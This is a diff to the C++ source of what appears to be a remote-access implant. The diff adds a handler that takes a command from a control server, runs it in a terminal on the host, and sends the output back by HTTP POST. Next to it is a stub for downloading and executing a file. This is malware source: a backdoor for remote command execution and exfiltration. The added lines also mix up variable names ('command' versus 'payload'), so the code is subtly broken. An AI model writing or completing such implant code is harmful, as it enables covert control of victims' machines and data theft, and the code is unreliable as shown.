@@ -153,10 +153,15 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
         else if (dwCommand == 0xAC) {
             // run command in terminal
             std::cout << "[IMPLANT] Received run command in terminal instruction" << std::endl;
+            std::vector<unsigned char> command = Communication::getPayload(packet);
+            std::string command_str(payload.begin(), payload.end());
+            std::string output = client::executeCmd(command_str);
 
             // encrypt output
 
             // return output - send HTTP POST request to server
+            unsigned char execute_instruction[] = {0xAC, 0x00, 0x00, 0x00};
+            std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(output.begin(), output.end()), execute_instruction);
         }
         else if (dwCommand == 0xA2) {
             // download file and execute
